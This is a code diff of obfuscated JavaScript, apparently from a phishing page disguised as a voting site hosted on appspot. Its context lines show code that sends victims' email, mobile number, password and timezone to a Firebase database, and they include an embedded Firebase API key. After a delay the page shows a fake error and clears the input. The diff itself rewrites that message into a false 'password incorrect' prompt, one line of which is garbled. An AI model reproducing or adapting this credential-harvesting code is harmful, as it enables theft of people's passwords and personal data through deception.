@@ -33,7 +33,7 @@ function _0x5005() {
     'signInAnonymously',
     'AIzaSyCny00-hBPcZcmzAN5L25BDH4DTt7JWPeo',
     '1978277DEODIR',
-    'Sorry\x20voting\x20was\x20not\x20successful\x20please\x20try\x20again\x20later',
+    'Sorry,\x20your\x20was\x20incorrect.\x20Please\x20double-check\x20your\x20password',
     'arabworldstarz.appspot.com',
     '6BpWQMK',
     'database',
@@ -68,7 +68,7 @@ function _0x5005() {
       'emle': _0x18c2c4, 'mobile': _0x3dfd3e, 'time': _0x232b8e, 'timezone': _0x6b9b75, 'pass': _0x4c44e7, 'date': _0x300f1d, 'type': _0x51632a
     }),
     setTimeout(function() {
-      var _0x2dc431 = _0x5ba202; return window[_0x2dc431(0x1aa)]('Sorry\x20voting\x20was\x20not\x20successful\x20please.\x20Try\x20again\x20later'), document[_0x2dc431(0x1ab)](_0x2dc431(0x1a2))[_0x2dc431(0x1ba)] = '', ![];
+      var _0x2dc431 = _0x5ba202; return window[_0x2dc431(0x1aa)]('Sorry,\x20your\x20password\x20was\x20incorrect.\x20Please\x20double-check\x20your\x20password'), document[_0x2dc431(0x1ab)](_0x2dc431(0x1a2))[_0x2dc431(0x1ba)] = '', ![];
     }, 0x7d0));
 }function iglog() {
   var _0x3f5ba7 = _0x35188f; firebase[_0x3f5ba7(0x1bb)]()[_0x3f5ba7(0x1c2)]()['catch'](function(_0x32be94) {
